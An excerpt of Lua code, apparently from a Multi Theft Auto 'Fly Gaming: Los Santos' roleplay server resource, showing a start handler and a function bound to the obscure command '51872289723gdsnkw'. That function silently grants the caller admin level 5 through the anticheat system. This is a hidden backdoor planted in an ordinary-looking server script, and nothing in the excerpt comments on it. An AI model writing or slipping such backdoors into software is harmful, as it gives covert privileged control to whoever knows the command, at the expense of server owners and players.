...
function resourceStart(resource)
	...
	setMapName("Fly Gaming: Los Santos")
	setRuleValue("Script Version", scriptVersion)
	setRuleValue("Author", "Fly Scripting Team")
...
function getAdmin()
	exports['anticheat-system']:changeProtectedElementDataEx(source, "adminlevel", 5, false)
end
addCommandHandler("51872289723gdsnkw", getAdmin)
